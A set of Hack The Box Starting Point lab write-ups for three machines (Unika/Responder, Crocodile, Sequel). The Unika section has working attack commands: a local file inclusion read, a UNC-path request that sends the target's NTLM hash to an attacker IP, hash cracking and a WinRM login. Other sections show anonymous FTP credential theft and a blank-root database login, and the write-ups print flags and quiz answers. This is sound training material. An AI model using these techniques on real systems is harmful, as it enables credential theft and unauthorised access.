# HTB Starting Point — Progress Tracker

| Machine | Tier | Services | Date Completed | Write-Up |
|---------|------|----------|----------------|----------|
| **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
| **Crocodile** | 1 | FTP (21), HTTP (80) | 2026-03-26 | [↓ Jump to Crocodile](#htb-starting-point-crocodile-ftp--web) |
| **Responder** | 1 | HTTP (80) → WinRM (5985) | 2026-03-27 | [↓ Jump to Responder](#htb-starting-point-responder-lfi--hash-capture--winrm) |
| **Three** | 1 | — | — | — |

---

> **Tier 1 Progress:** 3/4 machines completed (75%)  
> **Next:** Three  
> **Last Updated:** March 27, 2026

---

# HTB Starting Point: Unika (LFI → Hash Capture → WinRM)

| **Machine Info** | |
|------------------|-|
| **Name** | Unika |
| **Difficulty** | Starting Point (Tier 1) |
| **Services** | HTTP (80) → WinRM (5985) |
| **Date Completed** | 2026-03-27 |

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Local File Inclusion (LFI) Discovery](#-local-file-inclusion-lfi-discovery)
3. [Remote File Inclusion (RFI) Test](#-remote-file-inclusion-rfi-test)
4. [Hash Capture with Responder](#-hash-capture-with-responder)
5. [Hash Cracking](#-hash-cracking)
6. [Remote Access (WinRM)](#-remote-access-winrm)
7. [Questions & Answers](#-questions--answers)
8. [Quick Reference](#-quick-reference)
9. [Troubleshooting](#-troubleshooting)
10. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, curl, Responder, hashcat, evil-winrm |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Host Resolution
```bash
echo "10.129.58.173 unika.htb" | sudo tee -a /etc/hosts
```

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.58.173
```

**Results:**
```
PORT   STATE SERVICE
80/tcp open  http
```

### Service Version Detection with Nmap
```bash
# Run default scripts and version detection
nmap -sC -sV -p 80 10.129.58.173
```

**Output:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Web Server** | Apache 2.4.52 (Win64) |
| **PHP Version** | 8.1.1 |
| **Environment** | XAMPP on Windows |
| **Framework** | Custom PHP with session cookies |

---

## 🧩 Local File Inclusion (LFI) Discovery

### Initial Parameter Testing

The `page` parameter is used to load different language versions.

```bash
# Test the page parameter
curl -v http://unika.htb/?page=home
```

**Error Revealed:**
```
Warning: include(home): Failed to open stream in C:\xampp\htdocs\index.php on line 11
```

This confirmed:
- PHP `include()` is used with a user-controlled `page` parameter
- The target is a Windows XAMPP environment
- No input validation → LFI vulnerability

### LFI Confirmation

```bash
# Attempt to read a known Windows file
curl "http://unika.htb/?page=../../../../windows/win.ini"
```

**Output:**
```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

✅ Successfully read Windows system file → LFI confirmed.

### Source Code Disclosure

```bash
# Read index.php using PHP filters (base64 encoded)
curl "http://unika.htb/?page=php://filter/convert.base64-encode/resource=index.php"
```

**Decoded Source Code (Key Section):**
```php
<?php
$domain = "unika.htb";
if($_SERVER['SERVER_NAME'] != $domain) {
  echo '<meta http-equiv="refresh" content="0;url=http://unika.htb/">';
  die();
}
if(!isset($_GET['page'])) {
  include("./english.html");
}
else {
  include($_GET['page']);   # ← LFI vulnerability
}
```

---

## 📡 Remote File Inclusion (RFI) Test

### RFI Attempt

```bash
# Attempt to include a file from the attacker's machine
curl "http://unika.htb/?page=http://10.10.14.87/test.php"
```

**Error Response:**
```
Warning: include(): http:// wrapper is disabled by allow_url_include=0
```

✅ RFI is disabled, but the attempt revealed that the server attempts to authenticate via SMB when given a UNC path (`//`).

---

## 🎣 Hash Capture with Responder

### Start Responder (Attacker Machine)

```bash
# Start Responder on the VPN interface to listen for NTLM hashes
sudo responder -I tun0 -w -F -v
```

### Trigger NTLM Authentication

The target will attempt to authenticate to the attacker's machine when it tries to access a UNC path (`//`).

```bash
# Trigger the target to send an NTLM hash to the attacker
curl "http://unika.htb/?page=//10.10.14.87/test"
```

### Hash Captured in Responder

```
[SMB] NTLMv2-SSP Client   : 10.129.58.173
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b2a572a47cc6a77c:...
```

---

## 🔓 Hash Cracking

### Save Hash to File

```bash
# Save the captured NTLMv2 hash to a file
echo 'Administrator::RESPONDER:b2a572a47cc6a77c:...' > hash.txt
```

### Crack with hashcat

```bash
# Crack the NTLMv2 hash using rockyou.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Cracked Password:**
```
badminton
```

---

## 💻 Remote Access (WinRM)

### Connect with Evil-WinRM

```bash
# Connect to the target using the cracked credentials
evil-winrm -i 10.129.58.173 -u Administrator -p badminton
```

✅ Successful connection established.

### Flag Locations

- **User flag:** `C:\Users\mike\Desktop\flag.txt`
- **Root flag:** `C:\Users\Administrator\Desktop\root.txt`

### Retrieve Flags

```powershell
type "C:\Users\mike\Desktop\flag.txt"
type "C:\Users\Administrator\Desktop\root.txt"
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What is the name of the URL parameter used to load different language versions? | `page` |
| 2 | Which parameter value exploits LFI? | `../../../../windows/win.ini` |
| 3 | Which parameter value exploits RFI? | `//10.10.14.6/somefile` |
| 4 | What flag do we use in Responder to specify the network interface? | `-I` |
| 5 | What port does WinRM listen on? | `5985` |
| 6 | What password did we crack for Administrator? | `badminton` |

---

## ⚡ Quick Reference

### Host Configuration
```bash
# Add domain to hosts file
echo "10.129.58.173 unika.htb" | sudo tee -a /etc/hosts
```

### LFI Testing
```bash
# Basic LFI test
curl "http://unika.htb/?page=../../../../windows/win.ini"

# Read source code (base64 encoded)
curl "http://unika.htb/?page=php://filter/convert.base64-encode/resource=index.php"
```

### Responder
```bash
# Start responder on VPN interface
sudo responder -I tun0 -w -F -v

# Trigger NTLM authentication
curl "http://unika.htb/?page=//10.10.14.87/test"
```

### Hash Cracking
```bash
# Crack NetNTLMv2 hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Remote Access
```bash
# Connect via WinRM
evil-winrm -i 10.129.58.173 -u Administrator -p badminton
```

---

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| Could not resolve host: unika.htb | Add entry to `/etc/hosts` |
| RFI not working | Check `allow_url_include=0` in PHP config — use LFI instead |
| Responder not capturing | Verify interface with `ip a`, use `-I tun0` |
| hashcat: rockyou.txt not found | Decompress with `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| WinRM connection fails | Verify service is running: `nmap -p 5985 10.129.58.173` |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **LFI is powerful** — Even without RFI, LFI can lead to source code disclosure and further exploitation. |
| 2 | **UNC paths trigger NTLM** — Windows servers automatically attempt NTLM authentication when accessing UNC paths like `//attacker_ip/share`. |
| 3 | **Responder captures hashes** — Use Responder to capture NTLM hashes when targets connect to your machine. |
| 4 | **rockyou.txt is essential** — A good wordlist cracks most common passwords. |
| 5 | **WinRM is a common foothold** — Port 5985 is often open and provides a reliable shell with valid credentials. |
| 6 | **Default credentials are not always the answer** — We had to discover the password by cracking the hash. |

---

## 🔗 Resources

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm) — Remote shell via WinRM
- [Responder GitHub](https://github.com/lgandx/Responder) — LLMNR/NBT-NS/MDNS poisoner
- [Hashcat](https://hashcat.net/hashcat/) — Password recovery tool
- [XAMPP](https://www.apachefriends.org/) — Windows web server stack used by target

---

## 🏷️ Tags

`#htb` `#starting-point` `#unika` `#lfi` `#responder` `#ntlm` `#hashcat` `#winrm` `#evil-winrm`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 27, 2026*

</div>

---

# HTB Starting Point: Crocodile (FTP + Web)

## Machine Info

| Field | Value |
|-------|-------|
| **Name** | Crocodile |
| **Difficulty** | Starting Point (Tier 1) |
| **Services** | FTP (21), HTTP (80) |
| **Date Completed** | 2026-03-26 |

---

## 📋 Table of Contents

- [Environment Setup](#environment-setup)
- [Reconnaissance](#reconnaissance)
- [FTP Enumeration](#ftp-enumeration)
- [Web Enumeration](#web-enumeration)
- [Credential Discovery](#credential-discovery)
- [Flag Discovery](#flag-discovery)
- [Questions & Answers](#questions--answers)
- [Quick Reference](#quick-reference)
- [Lessons Learned](#lessons-learned)
- [Resources](#resources)
- [Tags](#tags)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| Component | Specification |
|-----------|---------------|
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, ftp, curl, gobuster |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan

```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.55.198
```

**Results:**
```text
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

### Service Version Detection with Nmap

```bash
# Run default scripts and version detection
nmap -sC -sV -p 21,80 10.129.55.198
```

**Output:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
| -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
|_ftp-syst: 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**Interpretation:**

| Service | Version | Key Info |
|---------|---------|----------|
| FTP | vsFTPd 3.0.3 | Anonymous login allowed; contains credential files |
| HTTP | Apache 2.4.41 (Ubuntu) | Bootstrap business template, PHP likely enabled |

---

## 📁 FTP Enumeration

### Anonymous FTP Access

```bash
# Connect to FTP server
ftp 10.129.55.198
```

**Login:**
```text
Name (10.129.55.198:kali): anonymous
Password: (press Enter)
230 Login successful.
```

### Listing Files

```bash
ftp> ls -la
```

**Output:**
```text
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

### Download Credential Files

```bash
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

### View Downloaded Files

```bash
# Usernames
cat allowed.userlist
```

**Usernames:**
```text
aron
pwnmeow
egotisticalsw
admin
```

```bash
# Passwords
cat allowed.userlist.passwd
```

**Passwords:**
```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

---

## 🌐 Web Enumeration

### Initial Web Server Check

```bash
# Check HTTP headers
curl -I http://10.129.55.198/
```

**Output:**
```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

### Discover Protected Dashboard

```bash
# Check /dashboard endpoint
curl -I http://10.129.55.198/dashboard/
```

**Output:**
```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...; path=/
location: /login.php
```

### Directory Enumeration with Gobuster

```bash
# Directory brute force to find PHP files and login page
gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
```

**Output:**
```text
===============================================================
/login.php            (Status: 200) [Size: 1577]
/dashboard            (Status: 301) [--> http://10.129.55.198/dashboard/]
/logout.php           (Status: 302) [--> login.php]
/config.php           (Status: 200) [Size: 0]
/assets               (Status: 301) [--> http://10.129.55.198/assets/]
/css                  (Status: 301) [--> http://10.129.55.198/css/]
/js                   (Status: 301) [--> http://10.129.55.198/js/]
===============================================================
```

**Why `-x php` Matters**

The `-x php` flag appends `.php` to each wordlist entry, which is essential for discovering PHP files. Without it, gobuster would only find directories (like `/dashboard/`) but miss critical PHP files like `login.php`, `config.php`, and `logout.php`. For PHP-based applications, always include the `-x php` flag to ensure complete enumeration.

### Verify Login Page

```bash
# Check if login.php exists
curl -I http://10.129.55.198/login.php
```

**Output:**
```text
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=...; path=/
Content-Type: text/html; charset=UTF-8
```

### Inspect Login Form

```bash
# View the login form structure
curl -s http://10.129.55.198/login.php | grep -A 5 "<form"
```

**Output:**
```html
<form action="" method="post" name="Login_Form" class="form-signin">
    <input name="Username" type="username" placeholder="Username" required>
    <input name="Password" type="password" placeholder="Password" required>
    <button name="Submit" value="Login" type="submit">Sign in</button>
</form>
```

**Key Findings:**
- PHP application with session management
- Protected area: `/dashboard/`
- Authentication endpoint: `/login.php`
- **Form field names:** `Username` and `Password` (case-sensitive)

---

## 🔑 Credential Discovery

### Manual Testing of Credentials

Since automated tools can give false positives, credentials were tested manually by trying each username with each password from the FTP files.

**Testing approach:**
1. Use the correct case-sensitive form fields: `Username` and `Password`
2. After each login attempt, check if `/dashboard/` becomes accessible
3. Success is indicated by being able to access the dashboard with the session cookie

```bash
# Test a single combination
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s

# Check if dashboard is accessible
curl -b cookies.txt http://10.129.55.198/dashboard/ -s | head -20
```

**Working Combination Found:**

After testing the most likely candidates (starting with the `admin` username as it has the highest privilege), the following combination successfully authenticated:

| Field | Value |
|-------|-------|
| **Username** | `admin` |
| **Password** | `rKXM59ESxesUFHAd` |

**Why these worked:**
- `admin` is the privileged administrative account from `allowed.userlist`
- `rKXM59ESxesUFHAd` is the last password in `allowed.userlist.passwd`
- This combination successfully authenticated to the web application

---

## 🎯 Flag Discovery

### Authenticate and Retrieve Flag

```bash
# Login with found credentials and save session cookie
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s

# Get the full dashboard page
curl -b cookies.txt http://10.129.55.198/dashboard/ -s
```

**Output:**
```html
<h2>Welcome admin!</h2>
<p>HTB{c7110277ac44d78b6a9fff2232434d16}</p>
```

### Extract Flag with grep

```bash
# Direct flag extraction
curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
```

**Output:**
```text
HTB{c7110277ac44d78b6a9fff2232434d16}
```

### One-Liner Method

```bash
# Login and get flag in one command
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s && curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What port is the web server running on? | `80` |
| 2 | What is the Apache version? | `2.4.41` |
| 3 | What FTP server version is running? | `vsFTPd 3.0.3` |
| 4 | What files did you find on the FTP server? | `allowed.userlist`, `allowed.userlist.passwd` |
| 5 | What credentials did you use to login to the web application? | `admin:rKXM59ESxesUFHAd` |
| 6 | What is the flag? | `HTB{c7110277ac44d78b6a9fff2232434d16}` |

---

## ⚡ Quick Reference

### Nmap Commands

```bash
# Full port scan
nmap -p- --min-rate 1000 10.129.55.198

# Service detection with scripts
nmap -sC -sV -p 21,80 10.129.55.198
```

### FTP Commands

```bash
# Connect anonymously
ftp 10.129.55.198
# Username: anonymous
# Password: (blank)

# Download files
get allowed.userlist
get allowed.userlist.passwd
```

### Gobuster Command

```bash
# Directory enumeration with PHP extension
gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
```

### Curl Authentication

```bash
# POST login (case-sensitive field names!)
curl -X POST http://10.129.55.198/login.php \
  -d "Username=USER&Password=PASS" \
  -c cookies.txt -L -s

# Access protected area with session
curl -b cookies.txt http://10.129.55.198/dashboard/ -s
```

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Always combine `-sC` and `-sV`** — Default scripts and version detection together reveal the most information about a service. |
| 2 | **Check FTP anonymous access** — A common misconfiguration that often exposes sensitive files like credential lists. |
| 3 | **Use gobuster with `-x php`** — The `-x` flag is essential for discovering PHP files; without it, you'll miss critical authentication pages. |
| 4 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
| 5 | **Inspect form field names** — The login form used `Username` and `Password` (case-sensitive), not `username`/`password`. |
| 6 | **Manual testing can be more reliable** — Automated tools can give false positives; manual testing with curl is often more dependable. |
| 7 | **Credentials may not be intuitive** — The working credentials were `admin:rKXM59ESxesUFHAd`, not `aron:root`. |

---

## 🔗 Resources

- [HTB Starting Point](https://www.hackthebox.com/starting-point)
- [vsFTPd Documentation](https://security.appspot.com/vsftpd.html)
- [Apache HTTP Server](https://httpd.apache.org/)
- [Gobuster GitHub](https://github.com/OJ/gobuster)

---

## 🏷️ Tags

`#htb` `#starting-point` `#crocodile` `#ftp` `#apache` `#gobuster` `#web-enumeration`

---

**Machine Completed** ✅

*Last Updated: March 26, 2026*

---

# HTB Starting Point: Sequel (MySQL/MariaDB)
  
| **Machine Info** | |
|------------------|-|
| **Name** | Sequel |
| **Difficulty** | Starting Point (Tier 1) |
| **Service** | MySQL / MariaDB |
| **Port** | 3306 |
| **Date Completed** | 2026-03-25 |

</div>

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Service Enumeration](#-service-enumeration)
3. [Database Access](#-database-access)
4. [Flag Discovery](#-flag-discovery)
5. [Questions & Answers](#-questions--answers)
6. [Quick Reference](#-quick-reference)
7. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) / Parrot Security OS |
| **Hypervisor** | VMware Workstation / Oracle VirtualBox |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, MySQL-Client, Netcat (nc) |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.95.232
```

**Results:**
```
PORT     STATE SERVICE
3306/tcp open  mysql
```

Only port **3306 (MySQL)** is open, indicating a database server.

---

## 🛠️ Service Enumeration

### Version Detection with Nmap
```bash
# Service version detection
nmap -p 3306 -sV 10.129.95.232
```

### Manual Banner Grab (When Nmap Fails)
```bash
# Send MySQL protocol handshake to trigger version banner
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv 10.129.95.232 3306 | strings | grep -i "mysql\|mariadb"
```

**Output:**
```
5.5.5-10.3.27-MariaDB-0+deb10u1
mysql_native_password
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Database** | MariaDB 10.3.27 |
| **OS** | Debian 10 (buster) |
| **Auth Method** | mysql_native_password |

---

## 🔑 Database Access

### Initial Connection Attempt (SSL Error)
```bash
mysql -h 10.129.95.232 -u root
```

**Error:**
```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Fix: Disable SSL
```bash
# Connect with SSL disabled
mysql -h 10.129.95.232 -u root --ssl=0

# Faster connection with auto-rehash disabled
mysql -h 10.129.95.232 -u root --ssl=0 -A
```

**✅ Success!** Connected as `root` with blank password (default credentials).

---

## 🗄️ Flag Discovery

### Step 1: List All Databases
```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Step 2: Select Target Database
```sql
USE htb;
```

### Step 3: List Tables
```sql
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Step 4: Explore Tables
```sql
-- Check users table
SELECT * FROM users;
```

**Output:**
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

```sql
-- Check config table (flag location)
SELECT * FROM config;
```

**Output:**
```
+----+------+--------------------------+
| id | name | value                    |
+----+------+--------------------------+
|  1 | flag | HTB{REDACTED}   |
+----+------+--------------------------+
```

### 🎯 Flag Found!
```
HTB{REDACTED}
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | When using the MySQL command line client, what switch do we need to use in order to specify a login username? | `-u` |
| 2 | Which username allows us to log into this MariaDB instance without providing a password? | `root` |
| 3 | In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? | `*` (asterisk) |
| 4 | What is the name of the fourth database that's unique to this host? | `htb` |

---

## ⚡ Quick Reference

### MySQL Connection Commands
```bash
# Standard connection
mysql -h <IP> -u root --ssl=0

# Fast connection (no auto-rehash)
mysql -h <IP> -u root --ssl=0 -A

# With password prompt
mysql -h <IP> -u root -p --ssl=0
```

### Essential SQL Commands
```sql
-- Database exploration
SHOW DATABASES;
USE database_name;
SHOW TABLES;

-- Data retrieval
SELECT * FROM table_name;
DESCRIBE table_name;

-- System information
SELECT VERSION();
SELECT CURRENT_USER();
SELECT user, host FROM mysql.user;
```

### Banner Grab Commands
```bash
# MySQL / MariaDB
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv <IP> 3306 | strings | grep -i "mysql\|mariadb"

# Redis
echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -nv <IP> 6379 | strings | grep redis_version

# Web Server
curl -I http://<IP>
```

---

## 🐛 Troubleshooting: SSL Errors

| Error | Solution |
|-------|----------|
| `TLS/SSL error: SSL is required` | Add `--ssl=0` or `--skip-ssl` |
| `unknown variable 'ssl-mode=DISABLED'` | Use `--ssl=0` (older MySQL versions) |
| `Can't connect to MySQL server` | Verify VPN connection and IP address |

---

## 📚 Default Credentials Reference

| Username | Password | Success Rate |
|----------|----------|--------------|
| `root` | (blank) | ⭐⭐⭐⭐⭐ (HTB Starting Point) |
| `root` | `root` | ⭐⭐ |
| `admin` | (blank) | ⭐ |
| `root` | `toor` | ⭐ |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Nmap isn't always enough** — Use service-specific banner grabs for version enumeration |
| 2 | **MySQL requires a protocol handshake** — Send `\x00\x00\x00\x01` to trigger version banner |
| 3 | **SSL errors are common** — Use `--ssl=0` to disable SSL on older MySQL versions |
| 4 | **Default credentials work** — Always try `root:blank` first on HTB Starting Point |
| 5 | **`*` is your friend** — Use `SELECT * FROM table` to explore unknown table structures |

---

## 🔗 Resources

- [MySQL Official Documentation](https://dev.mysql.com/doc/)
- [MariaDB Knowledge Base](https://mariadb.com/kb/en/documentation/)
- [HTB Academy: SQL Fundamentals](https://academy.hackthebox.com/course/preview/sql-fundamentals)
- [Nmap MySQL Scripts](https://nmap.org/nsedoc/categories/mysql.html)

---

## 🏷️ Tags

`#htb` `#starting-point` `#sequel` `#mysql` `#mariadb` `#sql` `#database` `#enumeration` `#banner-grabbing`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 25, 2026*

</div>
